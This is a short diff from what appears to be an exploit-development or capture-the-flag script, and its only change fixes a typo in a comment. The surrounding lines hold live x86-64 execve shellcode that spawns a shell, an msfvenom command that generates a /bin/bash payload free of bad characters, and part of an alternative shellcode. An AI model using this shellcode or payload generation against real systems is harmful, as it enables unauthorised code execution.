@@ -7,7 +7,7 @@ run_in_gdb = False
 #craft base payload
 shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 
 
-#shellcode with avoided charecters:
+#shellcode with avoided characters:
 #msfvenom -p linux/x64/exec CMD="/bin/bash" -f c -b 0123456789
 #shellcode =  b""
 #shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
